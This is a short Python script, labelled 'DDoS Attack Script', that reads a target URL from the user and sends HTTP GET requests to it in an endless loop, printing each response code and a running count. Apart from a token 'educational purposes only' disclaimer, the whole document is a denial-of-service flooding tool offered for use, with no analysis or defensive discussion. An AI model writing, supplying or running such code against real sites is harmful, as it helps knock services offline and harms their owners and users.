#DDos with python script
import requests
print("DDoS Attack Script")
print("This script is for educational purposes only. Use responsibly.")    
print("Enter the target URL (e.g., http://example.com):")
target = input()
i = 0

while True:
  r = requests.get(target)
  print("Sending request to " + target)
  print("Response code: " + str(r.status_code)) 
  i += 1
  print("Request number: " + str(i))

print(r.status_code)
